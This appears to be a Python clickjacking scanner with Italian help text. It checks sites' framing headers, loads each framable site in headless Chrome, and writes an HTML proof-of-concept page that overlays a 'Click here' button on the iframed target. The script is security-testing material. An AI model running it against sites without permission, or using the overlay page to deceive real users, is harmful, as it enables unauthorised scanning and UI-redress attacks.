#!/usr/bin/env python3
import argparse
import os
import time
import configparser
import sys
import uuid
import tempfile
from pathlib import Path
from urllib.parse import urlparse
import requests
import concurrent.futures
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import (
    WebDriverException,
    NoSuchFrameException,
    TimeoutException
)
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from tqdm import tqdm

POC_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking POC</title>
    <style>
        body {{
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }}
        .description {{
            text-align: center;
            margin-bottom: 20px;
            color: #333;
        }}
        h2 {{
            color: #000;
        }}
        p {{
            color: rgb(146, 83, 83);
            font-weight: bold;
        }}
        .container {{
            position: relative;
            width: 80%;
            max-width: 900px;
            height: 600px;
            border: 2px solid #ccc;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #fff;
        }}
        .container iframe {{
            width: 100%;
            height: 100%;
            border: none;
            display: block;
        }}
        .overlay-button {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            color: #fff;
            background-color: #ff5722;
            border: none;
            cursor: pointer;
            opacity: 1;
            z-index: 10;
            border-radius: 5px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }}
        .overlay-button:hover {{
            background-color: #e64a19;
        }}
    </style>
</head>
<body>
    <div class="description">
        <h2>Clickjacking Vulnerability POC</h2>
        <p>This vulnerability presents a security risk, allowing for potential manipulation<br> of user interactions and unauthorized data access without user consent.</p>
    </div>
    <div class="container">
        <iframe src="{victim_url}"></iframe>
        <button class="overlay-button">Click here</button>
    </div>
</body>
</html>
"""

def read_config():
    cfg = configparser.ConfigParser()
    cfg.read("config.ini")
    return cfg.get("settings", "webdriver_path", fallback="chromedriver")

def parse_arguments():
    p = argparse.ArgumentParser(description="Clickjacking POC tester con gestione redirect")
    grp = p.add_mutually_exclusive_group(required=True)
    grp.add_argument("-u", "--url", help="Singolo URL")
    grp.add_argument("-f", "--file-list", help="File con lista URL")
    p.add_argument("-o", "--output", default="output/", help="Cartella output")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-d", "--driver-path", help="Override ChromeDriver path")
    p.add_argument("-t", "--threads", type=int, default=1)
    return p.parse_args()

def resolve_redirect(url):
    try:
        r = requests.head(url, allow_redirects=True, timeout=10)
        final = r.url
        if final.rstrip("/") != url.rstrip("/"):
            return final
    except requests.RequestException:
        pass
    return url

def is_framable(url):
    try:
        r = requests.get(url, timeout=10, allow_redirects=False)
        if 300 <= r.status_code < 400:
            return False
        xfo = r.headers.get("X-Frame-Options", "").lower()
        csp = r.headers.get("Content-Security-Policy", "").lower()
        if "deny" in xfo or "sameorigin" in xfo or "frame-ancestors" in csp:
            return False
        return True
    except requests.RequestException:
        return False

def generate_and_save_poc(url, output_dir):
    domain = urlparse(url).netloc.replace("www.", "")
    html = POC_TEMPLATE.format(victim_url=url)
    path = Path(output_dir) / domain
    path.mkdir(parents=True, exist_ok=True)
    poc_file = path / f"poc_{domain}.html"
    poc_file.write_text(html, encoding="utf-8")
    return poc_file

def test_clickjacking(victim_url, driver_path, visited=None):
    if visited is None:
        visited = set()
    if victim_url in visited or len(visited) >= 3:
        return False
    visited.add(victim_url)

    if not is_framable(victim_url):
        return False

    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--ignore-certificate-errors")

    caps = DesiredCapabilities.CHROME.copy()
    caps["acceptInsecureCerts"] = True
    for cap, val in caps.items():
        opts.set_capability(cap, val)

    driver = webdriver.Chrome(service=ChromeService(executable_path=driver_path),options=opts)
    tmp = tempfile.NamedTemporaryFile("w", suffix=".html", delete=False)
    tmp.write(POC_TEMPLATE.format(victim_url=victim_url))
    tmp.close()

    try:
        driver.get(f"file://{tmp.name}")
        iframe = WebDriverWait(driver,5).until(EC.presence_of_element_located((By.TAG_NAME, "iframe")))
        driver.switch_to.frame(iframe)

        start = time.time()
        loaded_time = None
        timeout = 5
        stable_wait = 1

        while time.time() - start < timeout:
            try:
                current = driver.execute_script("return window.location.href")
            except WebDriverException:
                return False

            # Se cambia URL → segue redirect
            if current.rstrip("/") != victim_url.rstrip("/"):
                driver.quit()
                return test_clickjacking(current, driver_path, visited)

            state = driver.execute_script("return document.readyState")
            if state == "complete":
                if loaded_time is None:
                    loaded_time = time.time()
                elif time.time() - loaded_time >= stable_wait:
                    return True

            time.sleep(0.2)

        return False

    except (TimeoutException, NoSuchFrameException, WebDriverException):
        return False

    finally:
        driver.quit()
        try:
            os.unlink(tmp.name)
        except OSError:
            pass

def process_url(url, output_dir, driver_path, verbose):
    final = resolve_redirect(url)
    if final != url and verbose:
        print(f"[REDIRECT] {url} → {final}")
    if test_clickjacking(final, driver_path):
        poc = generate_and_save_poc(final, output_dir)
        return f"[VULNERABLE] {final}"
    return None

def main():
    args = parse_arguments()
    driver = args.driver_path or read_config()
    Path(args.output).mkdir(exist_ok=True)
    targets = [args.url] if args.url else Path(args.file_list).read_text().split()

    results = []
    for url in targets:
        out = process_url(url.strip(), args.output, driver, args.verbose)
        if out:
            print(out)
            results.append(out)
    if not results:
        print("Nessun sito vulnerabile trovato.")

if __name__ == "__main__":
    main()